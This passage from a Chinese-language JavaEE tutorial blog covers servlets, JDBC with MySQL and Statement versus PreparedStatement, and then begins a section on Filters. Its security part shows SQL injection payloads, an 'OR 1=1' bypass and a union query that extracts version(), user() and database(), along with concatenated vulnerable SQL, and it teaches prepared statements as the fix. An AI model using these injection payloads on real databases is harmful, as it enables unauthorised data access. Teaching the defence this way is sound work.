class="string">&quot;--------------doPost&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当Servlet首次创建时调用的初始化方法</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig config)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;--------------init&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 可以在这里添加任何初始化任务的代码</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当Servlet被销毁时调用的方法</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;--------------destroy&quot;</span>);</span><br><span class="line">        <span class="built_in">super</span>.destroy();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理GET和POST请求的服务方法</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;--------------http service&quot;</span>);</span><br><span class="line">        <span class="built_in">super</span>.service(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 覆盖的用于ServletRequest和ServletResponse的服务方法</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest req, ServletResponse res)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;--------------Servlet service&quot;</span>);</span><br><span class="line">        <span class="built_in">super</span>.service(req, res);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>web.xml无需修改</p>
<p>查看结果：</p>
<p><img src="/img/xiaodi/image-20250518222017180.png" alt="image-20250518222017180"></p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/3b44e1ad21771cf14a451fa19159b3af.png" alt="Untitled"></p>
<h3 id="HttpServletRequest-HttpServletResponse-详解"><a href="#HttpServletRequest-HttpServletResponse-详解" class="headerlink" title="HttpServletRequest  HttpServletResponse 详解"></a>HttpServletRequest  HttpServletResponse 详解</h3><p><strong>HttpServletRequest(HTTP请求的信息)</strong></p>
<blockquote>
<p>ServletRequest的子接口：<strong>HttpServletRequest是ServletRequest</strong>接口的子接口，提供了用于处理HTTP请求的额外功能。</p>
<p>​	getParameter(name)：通过参数名获取请求中的值。返回一个<strong>String</strong>，表示与给定参数名相对应的单个值。<br>​	getParameterValues(name)：通过参数名获取请求中的多个值。返回一个**String[]**，表示与给定参数名相对应的多个值。</p>
</blockquote>
<p><strong>HttpServletResponse(HTTP响应的信息)</strong></p>
<blockquote>
<p>ServletResponse的子接口：<strong>HttpServletResponse是ServletResponse</strong>接口的子接口，提供了用于处理HTTP响应的额外功能。<br>    setCharacterEncoding()：设置响应的字符编码格式。通常用于确保正确的文本输出。<br>    setContentType()：设置响应内容的类型和编码。常用于指定输出的数据类型，如HTML、JSON等。<br>    getWriter()：获取一个<strong>PrintWriter</strong>字符输出流，用于向客户端发送文本数据。<br>    PrintWriter：<strong>PrintWriter</strong>是用于向客户端输出字符数据的类，可以接受各种数据类型，然后将其转换为文本并发送到客户端。</p>
</blockquote>
<h2 id="数据库-JDBC-Mybatis-库"><a href="#数据库-JDBC-Mybatis-库" class="headerlink" title="数据库-JDBC&amp;Mybatis&amp;库"></a>数据库-JDBC&amp;Mybatis&amp;库</h2><p>-原生态数据库开发：JDBC<br>参考：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/ed1a59750127">https://www.jianshu.com/p/ed1a59750127</a></p>
<p>JDBC(Java Database connectivity): 由java提供,用于访问数据库的统一API接口规范.</p>
<p>数据库驱动: 由各个数据库厂商提供,用于访问数据库的jar包(JDBC的具体实现),遵循JDBC接口,以便java程序员使用！</p>
<h3 id="安装使用"><a href="#安装使用" class="headerlink" title="安装使用"></a>安装使用</h3><h4 id="安装jar"><a href="#安装jar" class="headerlink" title="安装jar"></a>安装jar</h4><p><a target="_blank" rel="noopener" href="https://mvnrepository.com/search?q=mysql">Maven Repository: mysql</a></p>
<p><img src="/img/xiaodi/image-20250519141733855.png" alt="image-20250519141733855"></p>
<p><img src="/img/xiaodi/image-20250519142027045.png" alt="image-20250519142027045"></p>
<h4 id="引用封装jar"><a href="#引用封装jar" class="headerlink" title="引用封装jar"></a>引用封装jar</h4><p>选择项目结构-&gt;模块-&gt;</p>
<p><img src="/img/xiaodi/image-20250519145302703.png" alt="image-20250519145302703"></p>
<h4 id="注册数据库驱动"><a href="#注册数据库驱动" class="headerlink" title="注册数据库驱动"></a>注册数据库驱动</h4><p><strong>“com.mysql.jdbc.Driver”</strong>： 这是 MySQL JDBC 驱动程序的类名。JDBC（Java Database Connectivity）是 Java 用于与数据库交互的 API，而不同的数据库供应商提供了各自的 JDBC 驱动程序。在这里，”com.mysql.jdbc.Driver” 是 MySQL JDBC 驱动程序的类名。</p>
<p><strong>加载和初始化</strong>： 当调用 Class.forName(“com.mysql.jdbc.Driver”); 时，它会尝试查找、加载并初始化指定的类。在这个过程中，MySQL JDBC 驱动程序的静态代码块（static {…}）会被执行，这通常用于注册驱动程序。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">首先,导入数据库驱动jar包(以MySQL为例,mysql-connector-java-5.1.40-bin.jar),然后注册驱动</span><br><span class="line"></span><br><span class="line">// 方法一.导致MySql驱动被注册两次,还导致程序和具体驱动类绑定,切换数据库,需要修改java源码重新编译,不建议使用！</span><br><span class="line">DriverManager.registerDriver(new Driver());</span><br><span class="line"></span><br><span class="line">// 方法二.驱动类的静态代码块已经注册驱动,只需要加载驱动类即可</span><br><span class="line">// 用反射加载,与驱动类字符串绑定,字符串可放在配置文件,切换数据库,无需改源码重新编译,只需要修改配置文件！    </span><br><span class="line">Class.forName(&quot;com.mysql.jdbc.Driver&quot;);</span><br></pre></td></tr></table></figure>

<h4 id="建立数据库连接"><a href="#建立数据库连接" class="headerlink" title="建立数据库连接"></a>建立数据库连接</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Connection connection = DriverManager.getConnection(url,user,password); </span><br><span class="line">    </span><br><span class="line">url格式</span><br><span class="line">    MySql:      jdbc:mysql://ip:3306/sid  (本机地址简写jdbc:mysql:///sid)</span><br><span class="line">    Oracle:     jdbc:oracle:thin:@ip:1521:sid</span><br><span class="line">    SqlServer:  jdbc:microsoft:sqlserver://ip:1433;DatabaseName=sid</span><br><span class="line">    </span><br><span class="line">参数(可选,user和password可以写在url参数中)</span><br><span class="line">    ?user=lioil&amp;password=***&amp;useUnicode=true&amp;characterEncoding=UTF-8</span><br><span class="line">    </span><br><span class="line">协议:子协议://ip地址:端口号/库名?参数1=值&amp;参数2=值</span><br><span class="line">jdbc:mysql://localhost:3306/sid?useUnicode=true&amp;characterEncoding=utf-8</span><br></pre></td></tr></table></figure>

<p>案例：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// 定义数据库连接的URL，格式为：jdbc:mysql://host:port/database</span><br><span class="line">            String url = &quot;jdbc:mysql://localhost:3306/demo01&quot;;</span><br><span class="line"></span><br><span class="line">            // 使用DriverManager获取数据库连接</span><br><span class="line">            Connection connection = DriverManager.getConnection(url, &quot;root&quot;, &quot;root&quot;);</span><br><span class="line"></span><br><span class="line">            // 打印数据库连接信息</span><br><span class="line">            System.out.println(connection);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/img/xiaodi/image-20250519145725589.png" alt="image-20250519145725589"></p>
<h4 id="创建Statement执行SQL"><a href="#创建Statement执行SQL" class="headerlink" title="创建Statement执行SQL"></a>创建Statement执行SQL</h4><p>onnection.createStatement();： 在<strong>Connection对象上调用createStatement方法，创建一个Statement对象。Statement对象用于执行SQL语句，它可以执行静态的SQL查询、更新、删除等操作。createStatement方法返回一个新的Statement</strong>对象。<br>创建一个<strong>Statement对象，然后使用该对象执行给定的SQL查询语句，将查询结果存储在一个ResultSet对象中。这样，您可以通过遍历ResultSet</strong>来检索和处理查询的结果集中的数据。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>Statement常用方法:</span><br><span class="line">    单个执行SQL语句</span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">execute</span><span class="params">(String sql)</span>         执行SQL语句,没有结果集返回<span class="literal">false</span>,有返回<span class="literal">true</span>(通过Statement.getResultSet获取结果集);</span><br><span class="line">    ResultSet <span class="title function_">executeQuery</span><span class="params">(String sql)</span>  执行select语句,返回结果集</span><br><span class="line">    <span class="type">int</span> <span class="title function_">executeUpdate</span><span class="params">(String sql)</span>       执行insert delete update语句,返回影响行数</span><br><span class="line">    </span><br><span class="line">    批量执行SQL语句(insert update delete)</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">addBatch</span><span class="params">(String sql)</span>           批量添加SQL语句(insert update delete)</span><br><span class="line">    <span class="type">int</span>[] executeBatch()                批量传输SQL到数据库执行,返回每个SQL语句影响行数(数组)</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">clearBatch</span><span class="params">()</span>                   清空SQL</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>单个执行SQL语句</span><br><span class="line">    <span class="comment">// 方法一.Statement</span></span><br><span class="line">    <span class="type">Statement</span> <span class="variable">statement</span> <span class="operator">=</span> connection.createStatement();</span><br><span class="line">    <span class="type">int</span> <span class="variable">row</span> <span class="operator">=</span> statement.executeUpdate(sql);</span><br><span class="line">    <span class="type">ResultSet</span> <span class="variable">resultSet</span> <span class="operator">=</span> statement.executeQuery(sql);</span><br><span class="line">    </span><br><span class="line">    ResultSet默认不能反向修改数据库记录,但可通过指定参数Statement来创建可改数据的ResultSet,不建议使用,应该用update语句修改数据!!!      </span><br><span class="line">        <span class="type">Statement</span> <span class="variable">state</span> <span class="operator">=</span> connection.createStatement(ResultSet.TYPE_FORWARD_ONLY,ResultSet.CONCUR_UPDATABLE);       </span><br><span class="line">        <span class="type">ResultSet</span> <span class="variable">resultSet</span> <span class="operator">=</span> state.executeQuery(<span class="string">&quot;select * from user&quot;</span>);     </span><br><span class="line">        resultSet.next();       </span><br><span class="line">        resultSet.updateString(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;lioil&quot;</span>);        </span><br><span class="line">        resultSet.updateRow();</span><br><span class="line">        </span><br><span class="line">        Statement <span class="title function_">createStatement</span><span class="params">(<span class="type">int</span> resultSetType, <span class="type">int</span> resultSetConcurrency)</span>  </span><br><span class="line">        resultSetType 结果集类型   </span><br><span class="line">            ResultSet.TYPE_FORWARD_ONLY        不支持滚动,只能向前.</span><br><span class="line">            ResultSet.TYPE_SCROLL_INSENSITIVE  支持滚动,迟钝不敏感</span><br><span class="line">            ResultSet.TYPE_SCROLL_SENSITIVE    支持滚动,敏感          </span><br><span class="line">        resultSetConcurrency 是否支持修改类型</span><br><span class="line">            ResultSet.CONCUR_READ_ONLY   不支持修改</span><br><span class="line">            ResultSet.CONCUR_UPDATABLE   支持修改</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 方法二.PrepareStatement预编译防止SQL注入攻击,用户参数?只做参数,不参与编译,传入SQL关键字无用</span></span><br><span class="line">    <span class="type">PrepareStatement</span> <span class="variable">statement</span> <span class="operator">=</span> connection.prepareStatement(<span class="string">&quot;SELECT * FROM user WHERE name=? AND password=?&quot;</span>);</span><br><span class="line">    statement.setString(<span class="number">1</span>, <span class="string">&quot;lioil&quot;</span>);</span><br><span class="line">    statement.setString(<span class="number">2</span>, <span class="string">&quot;12345&quot;</span>);    </span><br><span class="line">    <span class="type">ResultSet</span> <span class="variable">resultSet</span> <span class="operator">=</span> statement.executeQuery();</span><br><span class="line">    </span><br><span class="line">    statement.setInt(...);</span><br><span class="line">    statement.setDouble(...);</span><br><span class="line">    statement.setDate(...);</span><br><span class="line">    </span><br><span class="line">    SQL注入:用户恶意传入一些SQL特殊关键字,导致SQL语义变化</span><br><span class="line">    SELECT * FROM user WHERE name=<span class="string">&#x27;lioil&#x27;</span> AND password=<span class="string">&#x27;12345&#x27;</span>;          -- 正常  </span><br><span class="line">    SELECT * FROM user WHERE name=<span class="string">&#x27;lioil&#x27;</span> OR <span class="number">1</span>=<span class="number">1</span>; --<span class="string">&#x27; AND password=&#x27;</span><span class="number">1</span><span class="string">&#x27;;  -- 恶意注入&#x27;</span>lioil<span class="string">&#x27; OR 1=1; --&#x27;</span> 使语句在OR <span class="number">1</span>=<span class="number">1</span>;处结束,password没有执行</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span>批量执行SQL</span><br><span class="line">Statement批处理        </span><br><span class="line">    <span class="type">Statement</span> <span class="variable">smt</span> <span class="operator">=</span> conn.createStatement();</span><br><span class="line">    smt.addBatch(sql1);</span><br><span class="line">    smt.addBatch(sql2);</span><br><span class="line">    smt.addBatch(sql3); </span><br><span class="line">    smt.executeBatch();</span><br><span class="line">    </span><br><span class="line">    优点:可执行多条不同结构SQL语句</span><br><span class="line">    缺点:没预编译,效率低</span><br><span class="line">    </span><br><span class="line">PrparedStatement批处理     </span><br><span class="line">    <span class="type">PrepareStatement</span> <span class="variable">preSmt</span> <span class="operator">=</span> conn.prepareStatement(<span class="string">&quot;insert into user values(null,?)&quot;</span>);         </span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">100000</span>;i++)&#123;</span><br><span class="line">        preSmt.setString(<span class="number">1</span>,<span class="string">&quot;id_&quot;</span>+i);</span><br><span class="line">        preSmt.addBatch();      </span><br><span class="line">        <span class="comment">// 1000条为一批次, 减少内存占用</span></span><br><span class="line">        <span class="keyword">if</span>(i%<span class="number">1000</span>==<span class="number">0</span>)&#123;</span><br><span class="line">            preSmt.executeBatch();</span><br><span class="line">            preSmt.clearBatch();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    preSmt.executeBatch();</span><br><span class="line">    </span><br><span class="line">    优点:SQL结构相同,只编译一次,效率高</span><br><span class="line">    缺点:只能执行相同结构SQL语句</span><br></pre></td></tr></table></figure>

<p>案例：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建Statement对象</span></span><br><span class="line">Statement statement= connection.createStatement();</span><br><span class="line">String sql=<span class="string">&quot;select * from news&quot;</span>;</span><br><span class="line"><span class="comment">// 执行查询，获取结果集</span></span><br><span class="line"><span class="type">ResultSet</span> <span class="variable">resultSet</span> <span class="operator">=</span> statement.executeQuery(sql);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="对结果对象进行提取"><a href="#对结果对象进行提取" class="headerlink" title="对结果对象进行提取"></a>对结果对象进行提取</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 遍历结果集</span></span><br><span class="line"><span class="keyword">while</span> (resultSet.next()) &#123;</span><br><span class="line">    <span class="comment">// 从结果集中获取每一行的数据</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取整型列 &quot;id&quot;</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">id</span> <span class="operator">=</span> resultSet.getInt(<span class="string">&quot;id&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取字符串列 &quot;page_title&quot;</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">page_title</span> <span class="operator">=</span> resultSet.getString(<span class="string">&quot;page_title&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取字符串列 &quot;heading&quot;</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">heading</span> <span class="operator">=</span> resultSet.getString(<span class="string">&quot;heading&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取字符串列 &quot;subheading&quot;</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">subheading</span> <span class="operator">=</span> resultSet.getString(<span class="string">&quot;subheading&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取字符串列 &quot;content&quot;</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> resultSet.getString(<span class="string">&quot;content&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取字符串列 &quot;img&quot;</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">img</span> <span class="operator">=</span> resultSet.getString(<span class="string">&quot;img&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出每一行的数据，以便查看结果</span></span><br><span class="line">    System.out.println(id + <span class="string">&quot;|&quot;</span> + page_title + <span class="string">&quot;|&quot;</span> + heading + <span class="string">&quot;|&quot;</span> + subheading + <span class="string">&quot;|&quot;</span> + content + <span class="string">&quot;|&quot;</span> + img);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/img/xiaodi/image-20250519150518500.png" alt="image-20250519150518500"></p>
<p>完整代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.servletdemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.*;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NewsServlet</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, SQLException &#123;</span><br><span class="line">        Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span><span class="string">&quot;jdbc:mysql://localhost:3306/demo01&quot;</span>;</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> DriverManager.getConnection(url,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;123456&quot;</span>);</span><br><span class="line">        System.out.println(connection);</span><br><span class="line">        String sql=<span class="string">&quot;select * from news&quot;</span>;</span><br><span class="line">        <span class="comment">//危险写法</span></span><br><span class="line">        <span class="comment">//String vulsql=&quot;select * from news where id=&quot;+id;</span></span><br><span class="line">        <span class="comment">//预编译写法</span></span><br><span class="line">        String safesql=<span class="string">&quot;select * from news where id=?&quot;</span>;</span><br><span class="line">        System.out.println(sql);</span><br><span class="line">        Statement statement= connection.createStatement();</span><br><span class="line">        <span class="type">ResultSet</span> <span class="variable">resultSet</span> <span class="operator">=</span> statement.executeQuery(sql);</span><br><span class="line">        <span class="keyword">while</span> (resultSet.next())&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">id</span> <span class="operator">=</span> resultSet.getInt(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">page_title</span> <span class="operator">=</span> resultSet.getString(<span class="string">&quot;page_title&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">heading</span> <span class="operator">=</span> resultSet.getString(<span class="string">&quot;heading&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">subheading</span> <span class="operator">=</span> resultSet.getString(<span class="string">&quot;subheading&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> resultSet.getString(<span class="string">&quot;content&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">img</span> <span class="operator">=</span> resultSet.getString(<span class="string">&quot;img&quot;</span>);</span><br><span class="line">            System.out.println(id+<span class="string">&quot;|&quot;</span>+page_title+<span class="string">&quot;|&quot;</span>+heading+<span class="string">&quot;|&quot;</span>+subheading+<span class="string">&quot;|&quot;</span>+content+<span class="string">&quot;|&quot;</span>+img);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="安全问题"><a href="#安全问题" class="headerlink" title="安全问题"></a>安全问题</h3><p>1、存在SQL注入问题</p>
<p><img src="/img/xiaodi/a0af4204538d4e883187dc556c4beaa1.png" alt="Untitled"></p>
<p>select * from news where id&#x3D;1: 这是一个正常的SQL查询，目的是从名为”news”的表中选择ID为1的记录。</p>
<ol>
<li>union: 这是SQL的关键字，用于合并两个查询的结果集。</li>
<li>select 1,2,3,version(),user(),database(): 这是一个注入的查询，它返回了一些固定的值（1、2、3）以及数据库的版本信息（version()）、当前用户（user()）和当前数据库（database()）的信息。</li>
<li>通过将这两个查询合并，攻击者试图将恶意的查询注入到正常的查询中，从而获取数据库的敏感信息。这种类型的攻击被称为联合查询注入。</li>
</ol>
<p><img src="/img/xiaodi/c5c156145bc4012f038911f572efecc5.png" alt="Untitled"></p>
<p>防御方法：使用预编译</p>
<p>原理：<strong>提前编译好执行逻辑，你注入的语句不会改变原有逻辑！</strong></p>
<blockquote>
<ol>
<li><p>预编译写法： safesql 是一个预编译的 SQL 查询语句，其中 ? 是一个占位符，表示将在执行时动态替换。</p>
</li>
<li><p>使用 PreparedStatement： PreparedStatement 是 Statement 的子接口，用于执行预编译的 SQL 语句。通过调用 connection.prepareStatement(safesql) 创建一个 PreparedStatement 对象。</p>
</li>
<li><p>设置参数： 使用 setXXX 方法设置占位符的值。在这里，使用 setInt(1, id) 将 id 的值设置到第一个占位符上。这种方式防止了 SQL 注入攻击，因为参数值是通过预编译的方式传递的，而不是通过直接拼接字符串。</p>
</li>
<li><p>执行查询： 调用 executeQuery() 执行查询，得到 ResultSet 对象。</p>
</li>
<li><p>处理结果集： 根据业务需要，处理查询结果集的数据。</p>
</li>
</ol>
</blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 预编译写法</span></span><br><span class="line"><span class="type">String</span> <span class="variable">safesql</span> <span class="operator">=</span> <span class="string">&quot;SELECT * FROM news WHERE id=?&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用PreparedStatement</span></span><br><span class="line"><span class="keyword">try</span> (<span class="type">PreparedStatement</span> <span class="variable">preparedStatement</span> <span class="operator">=</span> connection.prepareStatement(safesql)) &#123;</span><br><span class="line">    <span class="comment">// 设置参数，防止SQL注入攻击</span></span><br><span class="line">    preparedStatement.setInt(<span class="number">1</span>, id);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行查询</span></span><br><span class="line">    <span class="type">ResultSet</span> <span class="variable">resultSet</span> <span class="operator">=</span> preparedStatement.executeQuery();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理结果集...</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="JavaEE应用-Filter过滤器-Listener监听器-访问控制"><a href="#JavaEE应用-Filter过滤器-Listener监听器-访问控制" class="headerlink" title="JavaEE应用&amp;Filter过滤器&amp;Listener监听器&amp;访问控制"></a>JavaEE应用&amp;<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=Filter%E8%BF%87%E6%BB%A4%E5%99%A8&spm=1001.2101.3001.7020">Filter过滤器</a>&amp;Listener监听器&amp;访问控制</h1><h2 id="JavaEE-过滤器-Filter"><a href="#JavaEE-过滤器-Filter" class="headerlink" title="JavaEE-过滤器-Filter"></a>JavaEE-过滤器-Filter</h2><p><img src="https://i-blog.csdnimg.cn/blog_migrate/1ce97a72714fba1ea18c9ad5fb936246.png" alt="Untitled"></p>
<p>Filter被称为过滤器，过滤器实际上就是对Web资源进行拦截，做一些处理后再交给下一个过滤器或Servlet处理，通常都是用来拦截request进行处理的，也可以对返回的 response进行拦截处理。开发人员利用filter技术，可以实现对所有Web资源的管理，例如实现权限访问控制、过滤敏感词汇、压缩响应信息等一些高级功能。</p>
<h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><blockquote>
<ul>
<li>创建新的项目FilterDemo1</li>
<li>在对应的包名上，创建分类包filter与servlet</li>
<li>在servlet下创建<code>TestServlet</code> ，并进行检测</li>
<li>启动服务器，尝试进行Xss攻击，发现可以</li>
</ul>
</blockquote>
<p>TestServlet.java代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demo1;</span><br><span class="line"></span><br><span class="line"><span 